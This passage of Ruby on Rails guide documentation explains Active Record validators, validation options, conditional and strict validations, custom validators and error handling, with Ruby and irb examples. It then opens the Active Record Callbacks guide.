  validates :registration_number, length: { is: 6 }
end
```

The possible length constraint options are:

| Option     | Description                                                                                           |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| `:minimum` | The attribute cannot have less than the specified length.                                             |
| `:maximum` | The attribute cannot have more than the specified length.                                             |
| `:in`      | The attribute length must be included in a given interval. The value for this option must be a range. |
| `:is`      | The attribute length must be equal to the given value.                                                |

The default error messages depend on the type of length validation being
performed. You can customize these messages using the `:wrong_length`,
`:too_long`, and `:too_short` options and `%{count}` as a placeholder for the
number corresponding to the length constraint being used. You can still use the
`:message` option to specify an error message.

```ruby
class Person < ApplicationRecord
  validates :bio, length: { maximum: 1000,
    too_long: "%{count} characters is the maximum allowed" }
end
```

NOTE: The default error messages are plural (e.g. "is too short (minimum is
%{count} characters)"). For this reason, when `:minimum` is 1 you should provide
a custom message or use `presence: true` instead. Similarly, when `:in` or
`:within` have a lower limit of 1, you should either provide a custom message or
call `presence` prior to `length`. Only one constraint option can be used at a
time apart from the `:minimum` and `:maximum` options which can be combined
together.

### `numericality`

This validator validates that your attributes have only numeric values. By
default, it will match an optional sign followed by an integer or floating point
number.

To specify that only integer numbers are allowed, set `:only_integer` to true.
Then it will use the following regular expression to validate the attribute's
value.

```ruby
/\A[+-]?\d+\z/
```

Otherwise, it will try to convert the value to a number using `Float`. `Float`s
are converted to `BigDecimal` using the column's precision value or a maximum of
15 digits.

```ruby
class Player < ApplicationRecord
  validates :points, numericality: true
  validates :games_played, numericality: { only_integer: true }
end
```

The default error message for `:only_integer` is _"must be an integer"_.

Besides `:only_integer`, this validator also accepts the `:only_numeric` option
which specifies the value must be an instance of `Numeric` and attempts to parse
the value if it is a `String`.

NOTE: By default, `numericality` doesn't allow `nil` values. You can use
`allow_nil: true` option to permit it. For `Integer` and `Float` columns empty
strings are converted to `nil`.

The default error message when no options are specified is _"is not a number"_.

There are also many options that can be used to add constraints to acceptable
values:

| Option                      | Description                                                              | Default Error Message                       |
| --------------------------- | ------------------------------------------------------------------------ | ------------------------------------------- |
| `:greater_than`             | Specifies the value must be greater than the supplied value.             | "must be greater than %{count}"             |
| `:greater_than_or_equal_to` | Specifies the value must be greater than or equal to the supplied value. | "must be greater than or equal to %{count}" |
| `:equal_to`                 | Specifies the value must be equal to the supplied value.                 | "must be equal to %{count}"                 |
| `:less_than`                | Specifies the value must be less than the supplied value.                | "must be less than %{count}"                |
| `:less_than_or_equal_to`    | Specifies the value must be less than or equal to the supplied value.    | "must be less than or equal to %{count}"    |
| `:other_than`               | Specifies the value must be other than the supplied value.               | "must be other than %{count}"               |
| `:in`                       | Specifies the value must be in the supplied range.                       | "must be in %{count}"                       |
| `:odd`                      | Specifies the value must be an odd number.                               | "must be odd"                               |
| `:even`                     | Specifies the value must be an even number.                              | "must be even"                              |


### `presence`

This validator validates that the specified attributes are not empty. It uses
the [`Object#blank?`][] method to check if the value is either `nil` or a blank
string - that is, a string that is either empty or consists of whitespace.

```ruby
class Person < ApplicationRecord
  validates :name, :login, :email, presence: true
end
```

```irb
person = Person.new(name: "Alice", login: "alice123", email: "alice@example.com")
person.valid?
=> true # presence validation passes

invalid_person = Person.new(name: "", login: nil, email: "bob@example.com")
invalid_person.valid?
=> false # presence validation fails
```

To check that an association is present, you'll need to test that the associated
object is present, and not the foreign key used to map the association. Testing
the association will help you to determine that the foreign key is not empty and
also that the referenced object exists.

```ruby
class Supplier < ApplicationRecord
  has_one :account
  validates :account, presence: true
end
```

```irb
irb> account = Account.create(name: "Account A")

irb> supplier = Supplier.new(account: account)
irb> supplier.valid?
=> true # presence validation passes

irb> invalid_supplier = Supplier.new
irb> invalid_supplier.valid?
=> false # presence validation fails
```

In cases where you use a custom `:foreign_key` or a `:through` association, it's
important to explicitly set the `:inverse_of` option to optimize the association
lookup. This helps avoid unnecessary database queries during validation.

For more details, check out the [Bi-directional Associations
documentation](association_basics.html#bi-directional-associations).

NOTE: If you want to ensure that the association is both present and valid, you
also need to use `validates_associated`. More on that
[below](#validates-associated).

If you validate the presence of an object associated via a
[`has_one`](association_basics.html#has-one) or
[`has_many`](association_basics.html#has-many) relationship, it
will check that the object is neither `blank?` nor `marked_for_destruction?`.

Since `false.blank?` is true, if you want to validate the presence of a boolean
field you should use one of the following validations:

```ruby
# Value _must_ be true or false
validates :boolean_field_name, inclusion: [true, false]
# Value _must not_ be nil, aka true or false
validates :boolean_field_name, exclusion: [nil]
```

By using one of these validations, you will ensure the value will NOT be `nil`
which would result in a `NULL` value in most cases.

The default error message is _"can't be blank"_.

[`Object#blank?`]:
    https://api.rubyonrails.org/classes/Object.html#method-i-blank-3F

### `uniqueness`

This validator validates that the attribute's value is unique right before the
object gets saved.

```ruby
class Account < ApplicationRecord
  validates :email, uniqueness: true
end
```

The validation happens by performing an SQL query into the model's table,
searching for an existing record with the same value in that attribute.

There is a `:scope` option that you can use to specify one or more attributes
that are used to limit the uniqueness check:

```ruby
class Holiday < ApplicationRecord
  validates :name, uniqueness: { scope: :year,
    message: "should happen once per year" }
end
```

WARNING. This validation does not create a uniqueness constraint in the
database, so a scenario can occur whereby two different database connections
create two records with the same value for a column that you intended to be
unique. To avoid this, you must create a unique index on that column in your
database.

In order to add a uniqueness database constraint on your database, use the
[`add_index`][] statement in a migration and include the `unique: true` option.

If you are using the `:scope` option in your uniqueness validation, and you wish
to create a database constraint to prevent possible violations of the uniqueness
validation, you must create a unique index on both columns in your database. See
[the MySQL manual][] and [the MariaDB manual][] for more details about multiple
column indexes, or [the PostgreSQL manual][] for examples of unique constraints
that refer to a group of columns.

There is also a `:case_sensitive` option that you can use to define whether the
uniqueness constraint will be case sensitive, case insensitive, or if it should
respect the default database collation. This option defaults to respecting the
default database collation.

```ruby
class Person < ApplicationRecord
  validates :name, uniqueness: { case_sensitive: false }
end
```

WARNING: Some databases are configured to perform case-insensitive searches
anyway.

A `:conditions` option can be used to specify additional conditions as a `WHERE`
SQL fragment to limit the uniqueness constraint lookup:

```ruby
validates :name, uniqueness: { conditions: -> { where(status: "active") } }
```

The default error message is _"has already been taken"_.

See [`validates_uniqueness_of`][] for more information.

[`validates_uniqueness_of`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Validations/ClassMethods.html#method-i-validates_uniqueness_of
[`add_index`]:
    https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/SchemaStatements.html#method-i-add_index
[the MySQL manual]:
    https://dev.mysql.com/doc/refman/en/multiple-column-indexes.html
[the MariaDB manual]: https://mariadb.com/kb/en/compound-composite-indexes/
[the PostgreSQL manual]:
    https://www.postgresql.org/docs/current/static/ddl-constraints.html

### `validates_associated`

You should use this validator when your model has associations that always need
to be validated. Every time you try to save your object, `valid?` will be called
on each one of the associated objects.

```ruby
class Library < ApplicationRecord
  has_many :books
  validates_associated :books
end
```

This validation will work with all of the association types.

WARNING: Don't use `validates_associated` on both ends of your associations.
They would call each other in an infinite loop.

The default error message for [`validates_associated`][] is _"is invalid"_. Note
that each associated object will contain its own `errors` collection; errors do
not bubble up to the calling model.

NOTE: [`validates_associated`][] can only be used with ActiveRecord objects,
everything up until now can also be used on any object which includes
[`ActiveModel::Validations`][].

[`validates_associated`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Validations/ClassMethods.html#method-i-validates_associated

### `validates_each`

This validator validates attributes against a block. It doesn't have a
predefined validation function. You should create one using a block, and every
attribute passed to [`validates_each`][] will be tested against it.

In the following example, we will reject names and surnames that begin with
lowercase.

```ruby
class Person < ApplicationRecord
  validates_each :name, :surname do |record, attr, value|
    record.errors.add(attr, "must start with upper case") if /\A[[:lower:]]/.match?(value)
  end
end
```

The block receives the record, the attribute's name, and the attribute's value.

You can do anything you like to check for valid data within the block. If your
validation fails, you should add an error to the model, therefore making it
invalid.

[`validates_each`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/ClassMethods.html#method-i-validates_each

### `validates_with`

This validator passes the record to a separate class for validation.

```ruby
class AddressValidator < ActiveModel::Validator
  def validate(record)
    if record.house_number.blank?
      record.errors.add :house_number, "is required"
    end

    if record.street.blank?
      record.errors.add :street, "is required"
    end

    if record.postcode.blank?
      record.errors.add :postcode, "is required"
    end
  end
end

class Invoice < ApplicationRecord
  validates_with AddressValidator
end
```

There is no default error message for `validates_with`. You must manually add
errors to the record's errors collection in the validator class.

NOTE: Errors added to `record.errors[:base]` relate to the state of the record
as a whole.

To implement the validate method, you must accept a `record` parameter in the
method definition, which is the record to be validated.

If you want to add an error on a specific attribute, you can pass it as the
first argument to the `add` method.

```ruby
def validate(record)
  if record.some_field != "acceptable"
    record.errors.add :some_field, "this field is unacceptable"
  end
end
```

We will cover [validation errors](#working-with-validation-errors) in greater
detail later.

The [`validates_with`][] validator takes a class, or a list of classes to use
for validation.

```ruby
class Person < ApplicationRecord
  validates_with MyValidator, MyOtherValidator, on: :create
end
```

Like all other validations, `validates_with` takes the `:if`, `:unless` and
`:on` options. If you pass any other options, it will send those options to the
validator class as `options`:

```ruby
class AddressValidator < ActiveModel::Validator
  def validate(record)
    options[:fields].each do |field|
      if record.send(field).blank?
        record.errors.add field, "is required"
      end
    end
  end
end

class Invoice < ApplicationRecord
  validates_with AddressValidator, fields: [:house_number, :street, :postcode, :country]
end
```

NOTE: The validator will be initialized *only once* for the whole application
life cycle, and not on each validation run, so be careful about using instance
variables inside it.

If your validator is complex enough that you want instance variables, you can
easily use a plain old Ruby object instead:

```ruby
class Invoice < ApplicationRecord
  validate do |invoice|
    AddressValidator.new(invoice).validate
  end
end

class AddressValidator
  def initialize(invoice)
    @invoice = invoice
  end

  def validate
    validate_field(:house_number)
    validate_field(:street)
    validate_field(:postcode)
  end

  private
    def validate_field(field)
      if @invoice.send(field).blank?
        @invoice.errors.add field, "#{field.to_s.humanize} is required"
      end
    end
end
```

We will cover [custom validations](#performing-custom-validations) more later.

[`validates_with`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/ClassMethods.html#method-i-validates_with

Validation Options
------------------

There are several common options supported by the validators. These options are:

* [`:allow_nil`](#allow-nil): Skip validation if the attribute is `nil`.
* [`:allow_blank`](#allow-blank): Skip validation if the attribute is blank.
* [`:message`](#message): Specify a custom error message.
* [`:on`](#on): Specify the contexts where this validation is active.
* [`:strict`](#strict-validations): Raise an exception when the validation
  fails.
* [`:if` and `:unless`](#conditional-validations): Specify when the validation
  should or should not occur.

NOTE: Not all of these options are supported by every validator, please refer to
the API documentation for [`ActiveModel::Validations`][].

[`ActiveModel::Validations`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations.html

### `:allow_nil`

The `:allow_nil` option skips the validation when the value being validated is
`nil`.

```ruby
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }, allow_nil: true
end
```

```irb
irb> Coffee.create(size: nil).valid?
=> true
irb> Coffee.create(size: "mega").valid?
=> false
```

For full options to the message argument please see the [message
documentation](#message).

### `:allow_blank`

The `:allow_blank` option is similar to the `:allow_nil` option. This option
will let validation pass if the attribute's value is `blank?`, like `nil` or an
empty string for example.

```ruby
class Topic < ApplicationRecord
  validates :title, length: { is: 6 }, allow_blank: true
end
```

```irb
irb> Topic.create(title: "").valid?
=> true
irb> Topic.create(title: nil).valid?
=> true
irb> Topic.create(title: "short").valid?
=> false # 'short' is not of length 6, so validation fails even though it's not blank
```

### `:message`

As you've already seen, the `:message` option lets you specify the message that
will be added to the `errors` collection when validation fails. When this option
is not used, Active Record will use the respective default error message for
each validation.

The `:message` option accepts either a `String` or `Proc` as its value.

A `String` `:message` value can optionally contain any/all of `%{value}`,
`%{attribute}`, and `%{model}` which will be dynamically replaced when
validation fails. This replacement is done using the [i18n
gem](https://github.com/ruby-i18n/i18n), and the placeholders must match
exactly, no spaces are allowed.

```ruby
class Person < ApplicationRecord
  # Hard-coded message
  validates :name, presence: { message: "must be given please" }

  # Message with dynamic attribute value. %{value} will be replaced
  # with the actual value of the attribute. %{attribute} and %{model}
  # are also available.
  validates :age, numericality: { message: "%{value} seems wrong" }
end
```

A `Proc` `:message` value is given two arguments: the object being validated,
and a hash with `:model`, `:attribute`, and `:value` key-value pairs.

```ruby
class Person < ApplicationRecord
  validates :username,
    uniqueness: {
      # object = person object being validated
      # data = { model: "Person", attribute: "Username", value: <username> }
      message: ->(object, data) do
        "Hey #{object.name}, #{data[:value]} is already taken."
      end
    }
end
```

To translate error messages, see the [I18n
guide](i18n.html#error-message-scopes).

### `:on`

The `:on` option lets you specify when the validation should happen. The default
behavior for all the built-in validations is to be run on save (both when you're
creating a new record and when you're updating it). If you want to change it,
you can use `on: :create` to run the validation only when a new record is
created or `on: :update` to run the validation only when a record is updated.

```ruby
class Person < ApplicationRecord
  # it will be possible to update email with a duplicated value
  validates :email, uniqueness: true, on: :create

  # it will be possible to create the record with a non-numerical age
  validates :age, numericality: true, on: :update

  # the default (validates on both create and update)
  validates :name, presence: true
end
```

You can also use `:on` to define custom contexts. Custom contexts need to be
triggered explicitly by passing the name of the context to `valid?`, `invalid?`,
or `save`.

```ruby
class Person < ApplicationRecord
  validates :email, uniqueness: true, on: :account_setup
  validates :age, numericality: true, on: :account_setup
end
```

```irb
irb> person = Person.new(age: 'thirty-three')
irb> person.valid?
=> true
irb> person.valid?(:account_setup)
=> false
irb> person.errors.messages
=> {:email=>["has already been taken"], :age=>["is not a number"]}
```

`person.valid?(:account_setup)` executes both the validations without saving the
model. `person.save(context: :account_setup)` validates `person` in the
`account_setup` context before saving.

Passing an array of symbols is also acceptable.

```ruby
class Book
  include ActiveModel::Validations

  validates :title, presence: true, on: [:update, :ensure_title]
end
```

```irb
irb> book = Book.new(title: nil)
irb> book.valid?
=> true
irb> book.valid?(:ensure_title)
=> false
irb> book.errors.messages
=> {:title=>["can't be blank"]}
```

When triggered by an explicit context, validations are run for that context, as
well as any validations _without_ a context.

```ruby
class Person < ApplicationRecord
  validates :email, uniqueness: true, on: :account_setup
  validates :age, numericality: true, on: :account_setup
  validates :name, presence: true
end
```

```irb
irb> person = Person.new
irb> person.valid?(:account_setup)
=> false
irb> person.errors.messages
=> {:email=>["has already been taken"], :age=>["is not a number"], :name=>["can't be blank"]}
```

You can read more about use-cases for `:on` in the [Custom Contexts
section](#custom-contexts).

Conditional Validations
-----------------------

Sometimes it will make sense to validate an object only when a given condition
is met. You can do that by using the `:if` and `:unless` options, which can take
a symbol, a `Proc` or an `Array`. You may use the `:if` option when you want to
specify when the validation **should** happen. Alternatively, if you want to
specify when the validation **should not** happen, then you may use the
`:unless` option.

### Using a Symbol with `:if` and `:unless`

You can associate the `:if` and `:unless` options with a symbol corresponding to
the name of a method that will get called right before validation happens. This
is the most commonly used option.

```ruby
class Order < ApplicationRecord
  validates :card_number, presence: true, if: :paid_with_card?

  def paid_with_card?
    payment_type == "card"
  end
end
```

### Using a Proc with `:if` and `:unless`

It is possible to associate `:if` and `:unless` with a `Proc` object which will
be called. Using a `Proc` object gives you the ability to write an inline
condition instead of a separate method. This option is best suited for
one-liners.

```ruby
class Account < ApplicationRecord
  validates :password, confirmation: true,
    unless: Proc.new { |a| a.password.blank? }
end
```

As `lambda` is a type of `Proc`, it can also be used to write inline conditions
taking advantage of the shortened syntax.

```ruby
validates :password, confirmation: true, unless: -> { password.blank? }
```

### Grouping Conditional Validations

Sometimes it is useful to have multiple validations use one condition. It can be
easily achieved using [`with_options`][].

```ruby
class User < ApplicationRecord
  with_options if: :is_admin? do |admin|
    admin.validates :password, length: { minimum: 10 }
    admin.validates :email, presence: true
  end
end
```

All validations inside of the `with_options` block will automatically have `if:
:is_admin?` merged into its options.

[`with_options`]:
    https://api.rubyonrails.org/classes/Object.html#method-i-with_options

### Combining Validation Conditions

On the other hand, when multiple conditions define whether or not a validation
should happen, an `Array` can be used. Moreover, you can apply both `:if` and
`:unless` to the same validation.

```ruby
class Computer < ApplicationRecord
  validates :mouse, presence: true,
                    if: [Proc.new { |c| c.market.retail? }, :desktop?],
                    unless: Proc.new { |c| c.trackpad.present? }
end
```

The validation only runs when all the `:if` conditions and none of the `:unless`
conditions are evaluated to `true`.

Strict Validations
------------------

You can also specify validations to be strict and raise
`ActiveModel::StrictValidationFailed` when the object is invalid.

```ruby
class Person < ApplicationRecord
  validates :name, presence: { strict: true }
end
```

```irb
irb> Person.new.valid?
=> ActiveModel::StrictValidationFailed: Name can't be blank
```

Strict validations ensure that an exception is raised immediately when
validation fails, which can be useful in situations where you want to enforce
immediate feedback or halt processing when invalid data is encountered. For
example, you might use strict validations in a scenario where invalid input
should prevent further operations, such as when processing critical transactions
or performing data integrity checks.

There is also the ability to pass a custom exception to the `:strict` option.

```ruby
class Person < ApplicationRecord
  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException
end
```

```irb
irb> Person.new.valid?
=> TokenGenerationException: Token can't be blank
```

Listing Validators
------------------

If you want to find out all of the validators for a given object, you can use
`validators`.

For example, if we have the following model using a custom validator and a
built-in validator:

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, on: :create
  validates :email, format: URI::MailTo::EMAIL_REGEXP
  validates_with MyOtherValidator, strict: true
end
```

We can now use `validators` on the "Person" model to list all validators, or
even check a specific field using `validators_on`.

```irb
irb> Person.validators
#=> [#<ActiveRecord::Validations::PresenceValidator:0x10b2f2158
      @attributes=[:name], @options={:on=>:create}>,
     #<MyOtherValidatorValidator:0x10b2f17d0
      @attributes=[:name], @options={:strict=>true}>,
     #<ActiveModel::Validations::FormatValidator:0x10b2f0f10
      @attributes=[:email],
      @options={:with=>URI::MailTo::EMAIL_REGEXP}>]
     #<MyOtherValidator:0x10b2f0948 @options={:strict=>true}>]

irb> Person.validators_on(:name)
#=> [#<ActiveModel::Validations::PresenceValidator:0x10b2f2158
      @attributes=[:name], @options={on: :create}>]
```

[`validate`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/ClassMethods.html#method-i-validate

Performing Custom Validations
-----------------------------

When the built-in validations are not enough for your needs, you can write your
own validators or validation methods as you prefer.

### Custom Validators

Custom validators are classes that inherit from [`ActiveModel::Validator`][].
These classes must implement the `validate` method which takes a record as an
argument and performs the validation on it. The custom validator is called using
the `validates_with` method.

```ruby
class MyValidator < ActiveModel::Validator
  def validate(record)
    unless record.name.start_with? "X"
      record.errors.add :name, "Provide a name starting with X, please!"
    end
  end
end

class Person < ApplicationRecord
  validates_with MyValidator
end
```

The easiest way to add custom validators for validating individual attributes is
with the convenient [`ActiveModel::EachValidator`][]. In this case, the custom
validator class must implement a `validate_each` method which takes three
arguments: record, attribute, and value. These correspond to the instance, the
attribute to be validated, and the value of the attribute in the passed
instance.

```ruby
class EmailValidator < ActiveModel::EachValidator
  def validate_each(record, attribute, value)
    unless URI::MailTo::EMAIL_REGEXP.match?(value)
      record.errors.add attribute, (options[:message] || "is not an email")
    end
  end
end

class Person < ApplicationRecord
  validates :email, presence: true, email: true
end
```

As shown in the example, you can also combine standard validations with your own
custom validators.

[`ActiveModel::EachValidator`]:
    https://api.rubyonrails.org/classes/ActiveModel/EachValidator.html
[`ActiveModel::Validator`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validator.html

### Custom Methods

You can also create methods that verify the state of your models and add errors
to the `errors` collection when they are invalid. You must then register these
methods by using the [`validate`][] class method, passing in the symbols for the
validation methods' names.

You can pass more than one symbol for each class method and the respective
validations will be run in the same order as they were registered.

The `valid?` method will verify that the `errors` collection is empty, so your
custom validation methods should add errors to it when you wish validation to
fail:

```ruby
class Invoice < ApplicationRecord
  validate :expiration_date_cannot_be_in_the_past,
    :discount_cannot_be_greater_than_total_value

  def expiration_date_cannot_be_in_the_past
    if expiration_date.present? && expiration_date < Date.today
      errors.add(:expiration_date, "can't be in the past")
    end
  end

  def discount_cannot_be_greater_than_total_value
    if discount > total_value
      errors.add(:discount, "can't be greater than total value")
    end
  end
end
```

By default, such validations will run every time you call `valid?` or save the
object. But it is also possible to control when to run these custom validations
by giving an `:on` option to the `validate` method, with either: `:create` or
`:update`.

```ruby
class Invoice < ApplicationRecord
  validate :active_customer, on: :create

  def active_customer
    errors.add(:customer_id, "is not active") unless customer.active?
  end
end
```

See the section above for more details about [`:on`](#on).

### Custom Contexts

You can define your own custom validation contexts for callbacks, which is
useful when you want to perform validations based on specific scenarios or group
certain callbacks together and run them in a specific context. A common scenario
for custom contexts is when you have a multi-step form and want to perform
validations per step.

For instance, you might define custom contexts for each step of the form:

```ruby
class User < ApplicationRecord
  validate :personal_information, on: :personal_info
  validate :contact_information, on: :contact_info
  validate :location_information, on: :location_info

  private
    def personal_information
      errors.add(:base, "Name must be present") if first_name.blank?
      errors.add(:base, "Age must be at least 18") if age && age < 18
    end

    def contact_information
      errors.add(:base, "Email must be present") if email.blank?
      errors.add(:base, "Phone number must be present") if phone.blank?
    end

    def location_information
      errors.add(:base, "Address must be present") if address.blank?
      errors.add(:base, "City must be present") if city.blank?
    end
end
```

In these cases, you may be tempted to [skip
callbacks](active_record_callbacks.html#skipping-callbacks) altogether, but
defining a custom context can be a more structured approach. You will need to
combine a context with the `:on` option to define a custom context for a
callback.

Once you've defined the custom context, you can use it to trigger the
validations:

```irb
irb> user = User.new(name: "John Doe", age: 17, email: "jane@example.com", phone: "1234567890", address: "123 Main St")
irb> user.valid?(:personal_info) # => false
irb> user.valid?(:contact_info) # => true
irb> user.valid?(:location_info) # => false
```

You can also use the custom contexts to trigger the validations on any method
that supports callbacks. For example, you could use the custom context to
trigger the validations on `save`:

```irb
irb> user = User.new(name: "John Doe", age: 17, email: "jane@example.com", phone: "1234567890", address: "123 Main St")
irb> user.save(context: :personal_info) # => false
irb> user.save(context: :contact_info) # => true
irb> user.save(context: :location_info) # => false
```

Working with Validation Errors
------------------------------

The [`valid?`][] and [`invalid?`][] methods only provide a summary status on
validity. However you can dig deeper into each individual error by using various
methods from the [`errors`][] collection.

The following is a list of the most commonly used methods. Please refer to the
[`ActiveModel::Errors`][] documentation for a list of all the available methods.

[`ActiveModel::Errors`]:
    https://api.rubyonrails.org/classes/ActiveModel/Errors.html

### `errors`

The [`errors`][] method is the starting point through which you can drill down
into various details of each error.

This returns an instance of the class `ActiveModel::Errors` containing all
errors, each error is represented by an [`ActiveModel::Error`][] object.

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end
```

```irb
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.full_messages
=> ["Name can't be blank", "Name is too short (minimum is 3 characters)"]

irb> person = Person.new(name: "John Doe")
irb> person.valid?
=> true
irb> person.errors.full_messages
=> []

irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.first.details
=> {:error=>:too_short, :count=>3}
```

[`ActiveModel::Error`]:
    https://api.rubyonrails.org/classes/ActiveModel/Error.html

### `errors[]`

[`errors[]`][Errors#squarebrackets] is used when you want to check the error
messages for a specific attribute. It returns an array of strings with all error
messages for the given attribute, each string with one error message. If there
are no errors related to the attribute, it returns an empty array.

This method is only useful _after_ validations have been run, because it only
inspects the `errors` collection and does not trigger validations itself. It's
different from the `ActiveRecord::Base#invalid?` method explained above because
it doesn't verify the validity of the object as a whole. `errors[]` only checks
to see whether there are errors found on an individual attribute of the object.

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end
```

```irb
irb> person = Person.new(name: "John Doe")
irb> person.valid?
=> true
irb> person.errors[:name]
=> []

irb> person = Person.new(name: "JD")
irb> person.valid?
=> false
irb> person.errors[:name]
=> ["is too short (minimum is 3 characters)"]

irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors[:name]
=> ["can't be blank", "is too short (minimum is 3 characters)"]
```

### `errors.where` and Error Object

Sometimes we may need more information about each error besides its message.
Each error is encapsulated as an `ActiveModel::Error` object, and the
[`where`][] method is the most common way of access.

`where` returns an array of error objects filtered by various degrees of
conditions.

Given the following validation:

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end
```

We can filter for just the `attribute` by passing it as the first parameter to
`errors.where(:attr)`. The second parameter is used for filtering the `type` of
error we want by calling `errors.where(:attr, :type)`.

```irb
irb> person = Person.new
irb> person.valid?
=> false

irb> person.errors.where(:name)
=> [ ... ] # all errors for :name attribute

irb> person.errors.where(:name, :too_short)
=> [ ... ] # :too_short errors for :name attribute
```

Lastly, we can filter by any `options` that may exist on the given type of error
object.

```irb
irb> person = Person.new
irb> person.valid?
=> false

irb> person.errors.where(:name, :too_short, minimum: 3)
=> [ ... ] # all name errors being too short and minimum is 3
```

You can read various information from these error objects:

```irb
irb> error = person.errors.where(:name).last

irb> error.attribute
=> :name
irb> error.type
=> :too_short
irb> error.options[:count]
=> 3
```

You can also generate the error message:

```irb
irb> error.message
=> "is too short (minimum is 3 characters)"
irb> error.full_message
=> "Name is too short (minimum is 3 characters)"
```

The [`full_message`][] method generates a more user-friendly message, with the
capitalized attribute name prepended. (To customize the format that
`full_message` uses, see the [I18n guide](i18n.html#active-model-methods).)

[`full_message`]:
    https://api.rubyonrails.org/classes/ActiveModel/Errors.html#method-i-full_message
[`where`]:
    https://api.rubyonrails.org/classes/ActiveModel/Errors.html#method-i-where

### `errors.add`

The [`add`][] method creates the error object by taking the `attribute`, the
error `type` and additional options hash. This is useful when writing your own
validator, as it lets you define very specific error situations.

```ruby
class Person < ApplicationRecord
  validate do |person|
    errors.add :name, :too_plain, message: "is not cool enough"
  end
end
```

```irb
irb> person = Person.new
irb> person.errors.where(:name).first.type
=> :too_plain
irb> person.errors.where(:name).first.full_message
=> "Name is not cool enough"
```

[`add`]:
    https://api.rubyonrails.org/classes/ActiveModel/Errors.html#method-i-add

### `errors[:base]`

You can add errors that are related to the object's state as a whole, instead of
being related to a specific attribute. To do this you must use `:base` as the
attribute when adding a new error.

```ruby
class Person < ApplicationRecord
  validate do |person|
    errors.add :base, :invalid, message: "This person is invalid because ..."
  end
end
```

```irb
irb> person = Person.new
irb> person.errors.where(:base).first.full_message
=> "This person is invalid because ..."
```

### `errors.size`

The `size` method returns the total number of errors for the object.

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end
```

```irb
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.size
=> 2

irb> person = Person.new(name: "Andrea", email: "andrea@example.com")
irb> person.valid?
=> true
irb> person.errors.size
=> 0
```

### `errors.clear`

The `clear` method is used when you intentionally want to clear the `errors`
collection. Of course, calling `errors.clear` upon an invalid object won't
actually make it valid: the `errors` collection will now be empty, but the next
time you call `valid?` or any method that tries to save this object to the
database, the validations will run again. If any of the validations fail, the
`errors` collection will be filled again.

```ruby
class Person < ApplicationRecord
  validates :name, presence: true, length: { minimum: 3 }
end
```

```irb
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.empty?
=> false

irb> person.errors.clear
irb> person.errors.empty?
=> true

irb> person.save
=> false

irb> person.errors.empty?
=> false
```

Displaying Validation Errors in Views
-------------------------------------

Once you've defined a model and added validations, you'll want to display an
error message when a validation fails during the creation of that model via a
web form.

Since every application handles displaying validation errors differently, Rails
does not include any view helpers for generating these messages. However, Rails
gives you a rich number of methods to interact with validations that you can use
to build your own. In addition, when generating a scaffold, Rails will put some
generated ERB into the `_form.html.erb` that displays the full list of errors on
that model.

Assuming we have a model that's been saved in an instance variable named
`@article`, it looks like this:

```html+erb
<% if @article.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@article.errors.count, "error") %> prohibited this article from being saved:</h2>

    <ul>
      <% @article.errors.each do |error| %>
        <li><%= error.full_message %></li>
      <% end %>
    </ul>
  </div>
<% end %>
```

Furthermore, if you use the Rails form helpers to generate your forms, when a
validation error occurs on a field, it will generate an extra `<div>` around the
entry.

```html
<div class="field_with_errors">
  <input id="article_title" name="article[title]" size="30" type="text" value="">
</div>
```

You can then style this div however you'd like. The default scaffold that Rails
generates, for example, adds this CSS rule:

```css
.field_with_errors {
  padding: 2px;
  background-color: red;
  display: table;
}
```

This means that any field with an error ends up with a 2 pixel red border.

### Customizing Error Field Wrapper

Rails uses the `field_error_proc` configuration option to wrap fields with
errors in HTML. By default, this option wraps the erroneous form fields in a
`<div>` with a `field_with_errors` class, as seen in the example above:

```ruby
config.action_view.field_error_proc = Proc.new { |html_tag, instance| content_tag :div, html_tag, class: "field_with_errors" }
```

You can customize this behavior by modifying the field_error_proc setting in
your application configuration, allowing you to change how errors are presented
in your forms. For more details, refer to the [Configuration Guide on
field_error_proc](configuring.html#config-action-view-field-error-proc).


<!-- ===== guides/source/active_record_callbacks.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Active Record Callbacks
=======================

This guide teaches you how to hook into the life cycle of your Active Record
objects.

After reading this guide, you will know:

* When certain events occur during the life of an Active Record object.
* How to register, run, and skip callbacks that respond to these events.
* How to create relational, association, conditional, and transactional
  callbacks.
* How to create objects that encapsulate common behavior for your callbacks to
  be reused.

--------------------------------------------------------------------------------

The Object Life Cycle
---------------------

During the normal operation of a Rails application, objects may be [created,
updated, and
destroyed](active_record_basics.html#crud-reading-and-writing-data). Active
Record provides hooks into this object life cycle so that you can control your
application and its data.

Callbacks allow you to trigger logic before or after a change to an object's
state. They are methods that get called at certain moments of an object's life
cycle. With callbacks it is possible to write code that will run whenever an
Active Record object is initialized, created, saved, updated, deleted,
validated, or loaded from the database.

```ruby
class BirthdayCake < ApplicationRecord
  after_create -> { Rails.logger.info("Congratulations, the callback has run!") }
end
```

```irb
irb> BirthdayCake.create
Congratulations, the callback has run!
```

As you will see, there are many life cycle events and multiple options to hook
into these — either before, after, or even around them.

Callback Registration
---------------------

To use the available callbacks, you need to implement and register them.
Implementation can be done in a multitude of ways like using ordinary methods,
blocks and procs, or defining custom callback objects using classes or modules.
Let's go through each of these implementation techniques.

